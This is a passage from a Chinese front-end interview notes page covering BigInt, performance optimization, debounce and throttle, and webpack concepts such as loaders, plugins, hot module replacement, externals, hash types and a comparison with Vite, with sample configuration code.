class="hljs-number">0</span>) &#123;<br>        result = carry + result;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>使用第三方库：</strong> 有一些第三方库可以处理大数学计算，如<code>big-integer</code>、<code>bignumber.js</code>等。这些库提供了高精度的整数运算功能。</p>
</li>
<li><p><strong>使用WebAssembly：</strong> 您可以使用WebAssembly编写高性能的C&#x2F;C++代码，以处理大数学计算，并将其嵌入到JavaScript中。</p>
</li>
<li><p><strong>分段计算：</strong> 对于非常大的整数，您可以将其分成多个小段进行计算，然后将结果组合在一起。这通常需要一些额外的编程工作。</p>
</li>
</ol>
<p>总的来说，处理大整数时，首选是使用JavaScript的<code>BigInt</code>类型，但如果有其他需求或限制，可以考虑使用上述方法之一来解决大数据问题。每种方法都有其优点和限制，具体的选择取决于项目的需求和复杂性。</p>
<h4 id="为什么bigInt可以表示这么大的数"><a href="#为什么bigInt可以表示这么大的数" class="headerlink" title="为什么bigInt可以表示这么大的数"></a>为什么bigInt可以表示这么大的数</h4><p><code>BigInt</code> 可以表示如此大的整数，主要是因为它的数据类型设计与常规的 <code>Number</code> 类型不同。这是由以下几个因素造成的：</p>
<ol>
<li><p><strong>不受固定位数限制：</strong> JavaScript 中的常规 <code>Number</code> 类型使用了双精度浮点数表示，它有一定的位数限制。最大安全整数是 2^53 - 1，超过这个范围的整数将丢失精度。而 <code>BigInt</code> 不受这个位数限制，它可以根据需要分配更多的位数以表示极大的整数。</p>
</li>
<li><p><strong>动态位数分配：</strong> <code>BigInt</code> 内部采用动态位数分配的方式，即根据实际需要动态分配足够的位数来存储整数。这意味着 <code>BigInt</code> 可以适应非常大的整数而不会丢失精度，但这也会占用更多的内存。</p>
</li>
<li><p><strong>精确整数计算：</strong> <code>BigInt</code> 的设计目标是支持精确的整数计算，而不会受到 JavaScript 浮点数的精度限制。这对于需要处理大整数的应用非常重要，如密码学、货币计算、大型整数的数值分析等领域。</p>
</li>
</ol>
<p>总之，<code>BigInt</code> 通过动态分配足够的位数来表示整数，不受固定位数限制，因此可以表示非常大的整数。这使得 JavaScript 在处理大整数时更加灵活和精确。但请注意，由于 <code>BigInt</code> 占用更多内存，因此在使用时需要谨慎考虑性能和内存消耗。</p>
<h2 id="常用框架及优化篇"><a href="#常用框架及优化篇" class="headerlink" title="常用框架及优化篇"></a>常用框架及优化篇</h2><h3 id="x3D-x3D-1、性能优化手段-x3D-x3D"><a href="#x3D-x3D-1、性能优化手段-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、性能优化手段&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、性能优化手段&#x3D;&#x3D;</h3><p>前端性能优化是确保网页在加载和交互方面具有良好性能的重要任务，这可以提高用户体验、减少跳失率，并有助于提高网站的排名。以下是一些前端性能优化的常见手段和最佳实践：</p>
<ol>
<li><p><strong>减少HTTP请求：</strong> 减少网页上的HTTP请求是提高性能的关键因素之一。合并和压缩CSS和JavaScript文件，减少图像数量，使用CSS Sprites（雪碧图）等方法可以帮助减少请求次数。</p>
</li>
<li><p><strong>使用浏览器缓存：</strong> 利用浏览器缓存来存储资源，例如CSS、JavaScript、图像和字体，以减少每次访问时的下载时间。使用适当的缓存控制头（如<code>Cache-Control</code>和<code>Expires</code>）来管理缓存。</p>
</li>
<li><p><strong>延迟加载（Lazy Loading）：</strong> 将页面上不是立即需要的资源（如图片或JavaScript）推迟到需要时再加载。这可以减少初始页面加载时间。</p>
</li>
<li><p><strong>使用CDN（内容分发网络）：</strong> 使用CDN来分发静态资源，以便更快速地将资源提供给用户，并减少服务器负载。</p>
</li>
<li><p><strong>优化图片：</strong> 使用适当的图像格式（如WebP、JPEG、PNG）和压缩工具来减小图像文件的大小。还可以使用响应式图像技术，根据设备的屏幕尺寸提供适当大小的图像。</p>
</li>
<li><p><strong>使用字体图标：</strong> 使用字体图标或SVG图标替代图像，以减少页面加载时间并提高分辨率无关性能。</p>
</li>
<li><p><strong>异步加载资源：</strong> 使用<code>async</code>或<code>defer</code>属性来异步加载JavaScript文件，以避免阻塞页面渲染。</p>
</li>
<li><p><strong>压缩代码：</strong> 使用JavaScript和CSS压缩工具来减小文件大小。这可以减少传输时间和加载时间。</p>
</li>
<li><p><strong>减少DOM操作：</strong> 减少频繁的DOM操作，因为DOM操作通常比其他操作更昂贵。尽量使用批处理操作来优化性能。</p>
</li>
<li><p><strong>使用现代Web技术：</strong> 使用现代的Web技术，如Service Workers、Web Workers、HTTP&#x2F;2等，以提高性能和响应速度。</p>
</li>
<li><p><strong>响应式设计：</strong> 使用响应式设计技术，以确保网站在各种设备和屏幕尺寸上都能提供最佳的用户体验。</p>
</li>
<li><p><strong>优化第三方库和插件：</strong> 仔细评估和选择第三方库和插件，并确保它们不会成为性能瓶颈。定期更新和监控这些库的性能。</p>
</li>
<li><p><strong>测量和监控性能：</strong> 使用工具如Google PageSpeed Insights、Lighthouse、WebPageTest等来测量和监控网站的性能，并及时解决问题。</p>
</li>
<li><p><strong>减少重定向和错误：</strong> 避免使用不必要的URL重定向，修复404错误，以确保用户不会遇到不必要的延迟。</p>
</li>
<li><p><strong>代码分割和按需加载：</strong> 使用现代构建工具（如Webpack）来实现代码分割和按需加载，以减小初始加载的资源大小。</p>
</li>
</ol>
<p>综合使用这些前端性能优化手段可以显著提高网站的加载速度和用户体验。然而，请注意，性能优化是一个不断迭代和改进的过程，需要根据具体的应用程序需求和情况来制定最佳的优化策略。</p>
<h5 id="防抖节流可以用到的场景"><a href="#防抖节流可以用到的场景" class="headerlink" title="防抖节流可以用到的场景"></a>防抖节流可以用到的场景</h5><p>防抖（Debouncing）和节流（Throttling）是用于控制函数触发频率的两种常见技术，它们在很多前端开发场景中都非常有用。以下是一些适合使用防抖和节流的常见场景：</p>
<p><strong>防抖（Debouncing）：</strong></p>
<ol>
<li><p><strong>输入框搜索：</strong> 当用户在搜索框中输入关键字时，防抖可以用于延迟发送搜索请求，以减少请求的数量。只有在用户停止输入一段时间后才执行搜索请求，避免频繁的搜索。</p>
</li>
<li><p><strong>窗口调整大小：</strong> 当窗口大小发生变化时，可以使用防抖来确保只在用户停止调整窗口大小后执行相关操作，以提高性能。</p>
</li>
<li><p><strong>滚动事件：</strong> 当用户滚动页面时，防抖可以用于延迟触发滚动事件处理程序，以减少处理滚动事件的频率，尤其是在处理复杂的动画或操作时。</p>
</li>
<li><p><strong>提交表单：</strong> 防抖可以用于延迟表单提交，确保用户在连续点击提交按钮时不会多次触发表单提交操作。</p>
</li>
</ol>
<p><strong>节流（Throttling）：</strong></p>
<ol>
<li><p><strong>限制函数调用频率：</strong> 节流可以用于限制某个函数的调用频率，例如，每隔一定时间执行一次函数，以防止函数被频繁触发。</p>
</li>
<li><p><strong>点击事件：</strong> 在处理按钮点击事件时，可以使用节流来确保用户点击按钮后只触发一次操作，而不管用户点击速度有多快。</p>
</li>
<li><p><strong>鼠标移动事件：</strong> 当处理鼠标移动事件时，节流可以用于减少事件处理的频率，以提高性能和响应速度。</p>
</li>
<li><p><strong>页面滚动加载：</strong> 在实现滚动加载更多内容的功能时，节流可以用于限制滚动事件的触发频率，从而减少请求次数。</p>
</li>
<li><p><strong>网络请求限制：</strong> 节流可以用于限制网络请求的发送频率，以防止过多的请求同时发送到服务器。</p>
</li>
</ol>
<p>总的来说，防抖和节流是用于优化性能和提高用户体验的常见技术，它们可以在各种交互和事件处理场景中发挥作用，确保函数不被过度触发，同时又能保持及时的响应性。根据具体的需求和场景，选择合适的技术来控制函数的触发频率非常重要。</p>
<h3 id="2、对webpack的理解"><a href="#2、对webpack的理解" class="headerlink" title="2、对webpack的理解"></a>2、对webpack的理解</h3><p>Webpack（通常简称为Webpack）是一个现代的 JavaScript 应用程序的静态模块打包工具。它是前端开发中非常常用的工具之一，用于将多个模块（包括 JavaScript、样式、图像等）打包成一个或多个最终的资源文件，以用于网页加载。以下是对Webpack的理解：</p>
<ol>
<li><p><strong>模块打包：</strong> Webpack的主要功能之一是将应用程序中的多个模块打包成一个或多个捆绑包（bundle）。这有助于减少HTTP请求的数量，提高网页加载速度，并简化了开发工作流程。</p>
</li>
<li><p><strong>依赖管理：</strong> Webpack能够识别模块之间的依赖关系，并自动解析和加载这些依赖。这使得开发者可以轻松地导入其他模块，而无需手动管理依赖路径。</p>
</li>
<li><p><strong>加载器（Loaders）：</strong> Webpack可以使用加载器处理非JavaScript文件，例如样式表、图像、字体等。开发者可以编写自定义加载器，或使用现有的加载器，以便在打包过程中对这些文件进行转换和处理。</p>
</li>
<li><p><strong>插件（Plugins）：</strong> Webpack的插件系统允许开发者在打包过程中执行各种自定义任务，例如代码压缩、代码分离、资源优化等。有许多社区维护的插件可供选择，或者可以编写自定义插件以满足特定需求。</p>
</li>
<li><p><strong>开发服务器（Development Server）：</strong> Webpack附带一个开发服务器，可以在开发过程中自动重新构建应用程序，并支持热模块替换（Hot Module Replacement，HMR），以实现在不刷新整个页面的情况下实时更新修改。</p>
</li>
<li><p><strong>代码分离（Code Splitting）：</strong> Webpack支持将应用程序拆分成多个块，以按需加载。这有助于减小初始加载时的文件大小，提高应用程序的性能。</p>
</li>
<li><p><strong>环境配置（Environment Configuration）：</strong> Webpack可以根据开发环境和生产环境的不同，自动配置不同的打包规则和插件。这使得开发者可以为不同的环境优化应用程序。</p>
</li>
<li><p><strong>生态系统：</strong> Webpack拥有广泛的社区支持和丰富的生态系统，有大量的插件和加载器可供使用，以及丰富的文档和教程资源。</p>
</li>
</ol>
<h5 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h5><p>Webpack 是一个用于打包前端项目的强大工具，其中有一些核心概念需要理解：</p>
<ol>
<li><p><strong>Module（模块）：</strong> 在Webpack中，一切皆为模块。JavaScript 文件、CSS 文件、图片等等都可以被视为模块。Webpack 将所有这些模块视为一个个独立的单元，可以进行打包和管理。</p>
</li>
<li><p><strong>Loader（加载器）：</strong> Loader 是用于处理不同类型文件的扩展模块，它们允许你在导入模块时预处理文件。例如，<code>babel-loader</code> 可以将 ES6&#x2F;ES7 代码转换成 ES5，<code>css-loader</code> 可以处理 CSS 文件。</p>
</li>
<li><p><strong>Plugin（插件）：</strong> 插件用于执行各种任务，从打包优化和压缩，到重新定义环境变量等。常用的插件包括 <code>HtmlWebpackPlugin</code> 用于生成 HTML 文件，<code>UglifyJsPlugin</code> 用于压缩 JavaScript 代码等。</p>
</li>
<li><p><strong>Entry（入口）：</strong> 入口是 Webpack 构建的起点。它指定了从哪个模块开始构建内部依赖图。通常，一个应用程序有一个主入口文件，但也可以有多个入口，例如用于拆分代码的多页应用。</p>
</li>
<li><p><strong>Output（输出）：</strong> 输出决定了 Webpack 打包后的文件应该存储在何处以及如何命名。你可以配置输出的文件名、路径和公共路径等。</p>
</li>
</ol>
<p>下面是一个简单的 Webpack 配置示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./src/index.js&#x27;</span>, <span class="hljs-comment">// 入口文件</span><br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>), <span class="hljs-comment">// 输出目录</span><br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;bundle.js&#x27;</span> <span class="hljs-comment">// 输出文件名</span><br>  &#125;,<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-comment">// 匹配以.js结尾的文件</span><br>        <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/node_modules/</span>, <span class="hljs-comment">// 排除 node_modules 目录</span><br>        <span class="hljs-attr">use</span>: &#123;<br>          <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span> <span class="hljs-comment">// 使用 babel-loader 处理</span><br>        &#125;<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>, <span class="hljs-comment">// 匹配以.css结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>] <span class="hljs-comment">// 先使用 css-loader 处理，再使用 style-loader 处理</span><br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>      <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27;./src/index.html&#x27;</span> <span class="hljs-comment">// 使用 HtmlWebpackPlugin 生成 HTML 文件</span><br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这只是 Webpack 配置的一个基本示例，Webpack 还有许多其他功能和配置选项，可以根据项目需求进行扩展和优化。总之，Webpack是一个强大的前端构建工具，它提供了许多功能来简化和优化前端开发流程。通过将模块打包成捆绑包、管理依赖、处理非JavaScript文件、自动化任务等，Webpack有助于提高开发效率和应用程序性能。因此，它已成为现代前端开发的标准工具之一。</p>
<h5 id="webpack的工作流程"><a href="#webpack的工作流程" class="headerlink" title="webpack的工作流程"></a>webpack的工作流程</h5><p>Webpack 的工作流程可以简单概括为以下几个步骤：</p>
<ol>
<li><strong>入口起点（Entry Point）：</strong> Webpack 从一个或多个入口起点开始构建应用程序的依赖关系图。入口起点是指定的文件（例如 JavaScript 文件），Webpack 从这些文件开始分析和处理依赖关系。</li>
<li><strong>依赖分析（Dependency Resolution）：</strong> 在分析入口文件后，Webpack 会递归地查找和分析依赖文件。这包括 JavaScript 文件中的 <code>import</code>、<code>require</code>，CSS 文件中的 <code>@import</code>，图片文件中的 <code>url()</code> 等。Webpack 将这些依赖关系建立成一个依赖图（Dependency Graph）。</li>
<li><strong>加载器处理（Loader）：</strong> 在分析依赖关系时，Webpack 遇到不同类型的文件，需要使用适当的加载器来处理这些文件。加载器允许你在导入模块时预处理文件，例如将 ES6 转换为 ES5、将 SCSS 转换为 CSS 等。加载器将文件转换为模块，以便后续处理。</li>
<li><strong>插件应用（Plugins）：</strong> Webpack 插件用于执行各种构建和优化任务。插件可以用于生成 HTML 文件、压缩代码、分离 CSS、定义环境变量等。插件可以在 Webpack 构建过程的不同阶段执行自定义任务。</li>
<li><strong>输出（Output）：</strong> Webpack 会将构建后的模块打包成一个或多个输出文件，这些输出文件包括 JavaScript 文件、CSS 文件、图片文件等。输出文件的配置由 Webpack 配置中的 <code>output</code> 字段定义。通常情况下，Webpack 会生成一个或多个 JavaScript 文件，其中一个是入口文件，其余是按需加载的模块。</li>
<li><strong>开发服务器（Development Server）：</strong> 在开发过程中，可以使用 Webpack Dev Server 等开发服务器来提供本地开发环境。开发服务器具有热模块替换（Hot Module Replacement，HMR）功能，可以在不刷新页面的情况下更新代码。</li>
<li><strong>生产构建（Production Build）：</strong> 在生产环境中，通常会运行 Webpack 的生产构建，这会执行代码压缩、优化、分割、提取公共代码等操作，以减小输出文件的大小并提高性能。</li>
<li><strong>部署应用程序：</strong> 最终生成的输出文件可以被部署到 Web 服务器上，以供用户访问。部署可以使用传统的服务器托管、云服务或内容分发网络（CDN）等方式进行。</li>
</ol>
<h5 id="webpack中plugin和常见的plugin"><a href="#webpack中plugin和常见的plugin" class="headerlink" title="webpack中plugin和常见的plugin"></a>webpack中plugin和常见的plugin</h5><p>在 Webpack 中，插件（Plugins）是用来扩展和定制构建过程的工具，它们可以执行各种任务，从优化代码到资源管理。以下是一些常见的 Webpack 插件以及它们的作用：</p>
<ol>
<li><p><strong>HtmlWebpackPlugin：</strong> 用于生成 HTML 文件，并自动引入打包后的 JavaScript 和 CSS 文件，可配置模板、压缩等选项。</p>
</li>
<li><p><strong>CleanWebpackPlugin：</strong> 在每次构建前清理输出目录，以确保构建输出是干净的。</p>
</li>
<li><p><strong>MiniCssExtractPlugin：</strong> 用于将 CSS 提取为独立的文件，适用于生产环境的 CSS 分离。</p>
</li>
<li><p><strong>OptimizeCSSAssetsWebpackPlugin：</strong> 用于优化和压缩 CSS 文件，通常与 <code>MiniCssExtractPlugin</code> 一起使用。</p>
</li>
<li><p><strong>CopyWebpackPlugin：</strong> 用于复制静态文件或目录到输出目录，如图片、字体等。</p>
</li>
<li><p><strong>DefinePlugin：</strong> 用于定义全局变量，可在代码中访问，常用于配置环境变量。</p>
</li>
<li><p><strong>ProvidePlugin：</strong> 自动加载模块，使模块中的变量可在全局范围内使用，例如自动引入 jQuery。</p>
</li>
<li><p><strong>HotModuleReplacementPlugin：</strong> 启用热模块替换（HMR），使在开发模式下代码修改后无需刷新浏览器即可看到变化。</p>
</li>
<li><p><strong>SplitChunksPlugin：</strong> 用于代码分割，将公共模块提取为独立的文件，提高构建速度和缓存利用。</p>
</li>
<li><p><strong>WebpackBar：</strong> 一个构建进度条插件，用于显示构建进度，更直观地查看构建状态。</p>
</li>
<li><p><strong>CompressionWebpackPlugin：</strong> 用于压缩构建输出，减小文件体积，提高加载速度，通常用于生产环境。</p>
</li>
<li><p><strong>FriendlyErrorsWebpackPlugin：</strong> 使 Webpack 构建错误信息更友好地显示在终端上，方便开发者调试。</p>
</li>
<li><p><strong>ESLintPlugin：</strong> 用于集成 ESLint，实现代码规范检查，保证代码质量。</p>
</li>
<li><p><strong>StylelintPlugin：</strong> 用于集成 Stylelint，实现样式文件的代码规范检查。</p>
</li>
<li><p><strong>HardSourceWebpackPlugin：</strong> 用于提高二次构建速度，通过缓存构建结果来减少重复构建。</p>
</li>
</ol>
<p>这些是一些常见的 Webpack 插件，它们可以根据项目的需求和场景选择性地配置和使用。通过合理使用插件，可以实现代码优化、资源管理、性能提升等各种功能，从而更高效地构建前端应用。</p>
<h5 id="webpack中css-loader-style-loader-scss-leader的各自作用和执行顺序"><a href="#webpack中css-loader-style-loader-scss-leader的各自作用和执行顺序" class="headerlink" title="webpack中css-loader,style-loader,scss-leader的各自作用和执行顺序"></a>webpack中css-loader,style-loader,scss-leader的各自作用和执行顺序</h5><p>在 Webpack 中，<code>css-loader</code>、<code>style-loader</code> 和 <code>scss-loader</code> 是用于处理样式文件的常用加载器。它们各自的作用和执行顺序如下：</p>
<ol>
<li><p><strong>css-loader：</strong></p>
<ul>
<li><code>css-loader</code> 用于处理 CSS 文件，将 CSS 文件转换为一个模块，使其能够被 JavaScript 引入。</li>
<li>它主要负责解析 CSS 文件中的 <code>@import</code> 和 <code>url()</code> 引用，并处理它们的依赖关系。</li>
<li>执行顺序：在 Webpack 配置中，<code>css-loader</code> 通常会被配置在最后，以确保其他加载器（如 <code>sass-loader</code> 或 <code>postcss-loader</code>）可以在样式文件经过处理后再由 <code>css-loader</code> 处理。</li>
</ul>
</li>
<li><p><strong>style-loader：</strong></p>
<ul>
<li><code>style-loader</code> 用于将 CSS 模块注入到 HTML 中的 <code>&lt;style&gt;</code> 标签内，以使样式生效。</li>
<li>它将样式模块的内容以内联的方式插入到 HTML 中，或者将样式以链接的方式生成外部 CSS 文件。</li>
<li>执行顺序：通常会在 <code>css-loader</code> 之前配置，以确保样式模块被加载后能够注入到页面中。</li>
</ul>
</li>
<li><p><strong>scss-loader（或 sass-loader）：</strong></p>
<ul>
<li><code>scss-loader</code>（或 <code>sass-loader</code>）用于处理 SCSS 或 Sass 文件，将其编译成纯 CSS。</li>
<li>它依赖于 <code>node-sass</code> 或 <code>dart-sass</code> 等编译器来将 SCSS&#x2F;Sass 转化为 CSS。</li>
<li>执行顺序：通常会在 <code>css-loader</code> 和 <code>style-loader</code> 之前配置，以确保在样式文件编译为 CSS 后，再由 <code>css-loader</code> 处理成 CSS 模块，最后通过 <code>style-loader</code> 注入到页面中。</li>
</ul>
</li>
</ol>
<p>执行顺序是非常重要的，通常在 Webpack 配置中，加载器的顺序会从右到左（或从下到上）应用于模块。例如，处理 SCSS 样式的配置可能如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">module</span>: &#123;<br>  <span class="hljs-attr">rules</span>: [<br>    &#123;<br>      <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/</span>,<br>      <span class="hljs-attr">use</span>: [<br>        <span class="hljs-string">&#x27;style-loader&#x27;</span>,   <span class="hljs-comment">// 将样式注入到页面</span><br>        <span class="hljs-string">&#x27;css-loader&#x27;</span>,     <span class="hljs-comment">// 处理 CSS 模块</span><br>        <span class="hljs-string">&#x27;sass-loader&#x27;</span>     <span class="hljs-comment">// 编译 SCSS 成 CSS</span><br>      ]<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个配置会先由 <code>sass-loader</code> 处理 SCSS 文件，然后由 <code>css-loader</code> 处理成 CSS 模块，最后由 <code>style-loader</code> 将样式注入到页面中。这是一个常见的样式加载器配置，但具体的配置可能因项目需求而异。</p>
<h5 id="webpack中热更新原理"><a href="#webpack中热更新原理" class="headerlink" title="webpack中热更新原理"></a>webpack中热更新原理</h5><p>Webpack 的热更新（Hot Module Replacement，HMR）是一项非常有用的功能，它允许在开发过程中无需刷新整个页面即可实时更新代码。这个功能通过以下原理来实现：</p>
<ol>
<li><p><strong>模块标识（Module ID）：</strong> 在启用 HMR 时，Webpack 会为每个模块分配一个唯一的标识符（Module ID）。这个标识符在模块发生变化时保持不变，即使代码发生变化。</p>
</li>
<li><p><strong>热替换运行时（Hot Replacement Runtime）：</strong> Webpack 内置了一个运行时环境，它负责管理模块的热替换。这个运行时环境在启动时会记录当前模块的版本号和依赖关系。</p>
</li>
<li><p><strong>监视文件变化：</strong> Webpack 会监视项目中的文件变化，包括源代码文件和依赖模块。</p>
</li>
<li><p><strong>模块替换（Module Replacement）：</strong> 当一个文件发生变化时，Webpack 会通知热替换运行时，然后它会与当前运行中的应用程序进行通信。</p>
</li>
<li><p><strong>更新处理（Update Handling）：</strong> 热替换运行时会与新模块进行比较，找出哪些模块发生了变化。</p>
</li>
<li><p><strong>应用更新（Apply Updates）：</strong> 一旦确定了哪些模块需要更新，热替换运行时会尝试替换这些模块。如果替换成功，应用程序的状态会保持不变，但新代码已经在运行中。</p>
</li>
<li><p><strong>触发回调（Trigger Callbacks）：</strong> 一旦更新成功，Webpack 会触发回调函数，开发者可以在这些回调中执行一些自定义逻辑，如更新 UI 界面。</p>
</li>
</ol>
<p>总的来说，Webpack 的热更新通过在运行时管理模块的替换，使得在开发过程中可以实时应用代码变化而不需要刷新整个页面。这大大提高了开发效率，特别是在大型项目中。要启用热更新，通常需要在 Webpack 配置中添加相应的插件（如 <code>webpack.HotModuleReplacementPlugin</code>）以及一些开发服务器的配置（如 webpack-dev-server）。</p>
<h5 id="webpack中externl作用"><a href="#webpack中externl作用" class="headerlink" title="webpack中externl作用"></a>webpack中externl作用</h5><p>在 Webpack 中，<code>externals</code> 是一个配置选项，用于告诉 Webpack 哪些模块应该不被打包进输出的 bundle 文件中，而是在运行时从外部引入。这通常用于将一些库或模块作为外部依赖，在构建时不将它们包含到最终的输出文件中。这可以减小 bundle 文件的大小，加快加载速度，并且能够充分利用浏览器的缓存机制。</p>
<p><code>externals</code> 的基本作用如下：</p>
<ol>
<li><p><strong>避免重复打包：</strong> 如果你的项目依赖于一些第三方库（例如 jQuery、React、Vue 等），而这些库已经通过其他方式引入，例如通过 CDN 或在全局范围内加载，那么你可以使用 <code>externals</code> 将这些库排除在打包过程之外，避免重复打包它们。</p>
</li>
<li><p><strong>提供全局变量：</strong> 通过 <code>externals</code> 配置，你可以告诉 Webpack 这些库在全局作用域中可用，并且不需要被打包。这允许你在代码中直接引用这些库，而不需要使用 <code>import</code> 或 <code>require</code>。</p>
</li>
</ol>
<p>下面是一个示例，展示如何在 Webpack 中使用 <code>externals</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-attr">externals</span>: &#123;<br>    <span class="hljs-comment">// key 是你在代码中引用的模块名，value 是全局变量名</span><br>    <span class="hljs-attr">jquery</span>: <span class="hljs-string">&#x27;jQuery&#x27;</span>,<br>    <span class="hljs-attr">lodash</span>: <span class="hljs-string">&#x27;_&#x27;</span>,<br>  &#125;,<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在上述示例中，我们告诉 Webpack 将 <code>jquery</code> 模块排除在打包之外，并将其视为全局变量 <code>jQuery</code>。这意味着在代码中可以直接使用 <code>$</code> 或 <code>jQuery</code> 变量，而不需要通过 <code>import</code> 或 <code>require</code> 引入。</p>
<p>注意事项：</p>
<ul>
<li>使用 <code>externals</code> 时，需要确保全局变量在项目中是可用的，通常通过在 HTML 文件中引入相应的 CDN 资源或其他方式来实现。</li>
<li>使用 <code>externals</code> 可能会增加一些配置复杂性，因为你需要确保模块名和全局变量名的映射是正确的。</li>
<li>对于一些复杂的模块，可能需要额外的配置，例如在打包时排除模块的某些部分。</li>
</ul>
<p>总之，<code>externals</code> 是一个用于管理外部依赖的重要配置选项，能够帮助你更灵活地处理项目中的模块引入和打包。</p>
<h5 id="webpack中hash-、-chunk-hash-、-content-hash区别"><a href="#webpack中hash-、-chunk-hash-、-content-hash区别" class="headerlink" title="webpack中hash 、 chunk hash 、 content hash区别"></a>webpack中hash 、 chunk hash 、 content hash区别</h5><p>在 Webpack 中，有三种不同的哈希（hash）类型，分别是 <code>hash</code>、<code>chunkhash</code> 和 <code>contenthash</code>，它们用于生成文件名或文件内容的唯一标识符，通常用于缓存控制和文件版本管理。以下是它们之间的区别：</p>
<ol>
<li><p><strong>hash：</strong></p>
<ul>
<li><code>hash</code> 是 Webpack 生成的每次构建的哈希值，它代表整个构建过程的内容，包括入口文件、模块代码、依赖等。</li>
<li>所有输出文件都会共享相同的 <code>hash</code>，这意味着如果任何一个文件发生了变化，所有的输出文件的哈希值都会改变。</li>
<li>适用于在开发阶段进行快速构建，但不适合生产环境，因为每次构建都会导致所有文件的哈希变化，使缓存失效。</li>
</ul>
</li>
<li><p><strong>chunk hash：</strong></p>
<ul>
<li><code>chunkhash</code> 是根据每个文件的内容生成的哈希值。每个入口文件和它所依赖的模块都有一个独立的 <code>chunkhash</code>。</li>
<li>当一个模块的内容发生变化时，只会影响到与该模块相关的输出文件的 <code>chunkhash</code>。</li>
<li>适用于生产环境，可以实现文件级别的缓存控制，只有发生实际更改的文件的哈希值会改变。</li>
</ul>
</li>
<li><p><strong>content hash：</strong></p>
<ul>
<li><code>contenthash</code> 是根据文件内容生成的哈希值，只有文件内容发生变化时，它的值才会改变。</li>
<li><code>contenthash</code> 通常用于处理 CSS 文件、图片文件等不会频繁变动的文件，以确保这些文件在内容不变的情况下能够保持相同的哈希值，从而实现缓存控制。</li>
<li>对于具有稳定内容的文件，使用 <code>contenthash</code> 是一种非常有效的缓存策略。</li>
</ul>
</li>
</ol>
<p>通常情况下，在生产环境中，建议使用 <code>chunkhash</code> 或 <code>contenthash</code> 来实现文件级别的缓存控制，以确保只有发生实际更改的文件才会导致哈希值的变化，从而减小浏览器缓存失效的风险。在开发阶段，可以使用 <code>hash</code> 来快速构建和调试，因为它会在每次构建中都生成新的哈希值。</p>
<h5 id="webpack和vite的对比"><a href="#webpack和vite的对比" class="headerlink" title="webpack和vite的对比"></a>webpack和vite的对比</h5><p>Webpack 和 Vite 都是前端开发构建工具，但它们有一些重要的区别，以下是它们的对比：</p>
<ol>
<li><p><strong>构建速度：</strong></p>
<ul>
<li>Webpack：Webpack 是一个强大的构建工具，但在大型项目中，由于需要构建整个应用，初始启动和热更新的速度相对较慢。</li>
<li>Vite：Vite 的独特之处在于其快速的开发体验。它利用 ES 模块的特性，将构建分解为按需构建，因此启动和热更新速度非常快。这使得在开发过程中能够快速预览和调试代码变化。</li>
</ul>
</li>
<li><p><strong>构建方式：</strong></p>
<ul>
<li>Webpack：Webpack 使用传统的“静态依赖分析”方式构建项目，将所有的模块打包成一个或多个 bundle 文件。这种方式适用于大型复杂的应用，但在开发过程中构建速度较慢。</li>
